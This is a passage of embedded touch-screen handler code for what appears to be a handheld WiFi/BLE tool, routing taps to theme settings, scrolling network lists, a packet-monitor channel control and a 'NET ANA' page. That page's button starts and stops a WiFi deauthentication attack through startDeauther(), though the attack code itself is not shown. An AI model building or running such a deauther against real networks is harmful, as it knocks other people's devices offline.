                if(x > 20 && x < 80) THEME_MAIN = C_CYAN;       
                else if(x > 95 && x < 155) THEME_MAIN = C_GREEN; 
                else if(x > 170 && x < 230) THEME_MAIN = C_RED; 
                else if(x > 245 && x < 305) THEME_MAIN = 0xFD20;
                drawSettings(); 
            }
        }
        
        // WIFI & BLE (Scrolling)
        else if(currentPage == PAGE_WIFI || currentPage == PAGE_BLE) {
            if(x > 290 && y > 70 && y < 130) {
                if(scrollOffset > 0) { scrollOffset--; drawListItems(); }
            }
            else if(x > 290 && y > 140 && y < 200) {
                if(scrollOffset + 5 < listCount) { scrollOffset++; drawListItems(); }
            }
            else if(x < 100 && y > 200) {
                if(currentPage == PAGE_WIFI) drawWiFiPage(); else drawBLEPage();
            }
        }
        
        // PACKET MONITOR (Channel Controls)
        else if(currentPage == PAGE_PACKET) {
            if(x > 20 && x < 80 && y > 50 && y < 90) changeChannel(-1);
            else if(x > 240 && x < 300 && y > 50 && y < 90) changeChannel(1);
        }
        
        // NET ANA (Deauther Control)
        else if(currentPage == PAGE_NET_ANA) {
            // START/STOP button: x: 30-150, y: 190-230
            if(x > 30 && x < 150 && y > 190 && y < 230) {
                if(isDeauthRunning) {
                    stopDeauther();
                } else {
                    startDeauther();
                }
                drawNetAnaUI();
            }
        }

        lastDebounce = millis();
    }
  }
}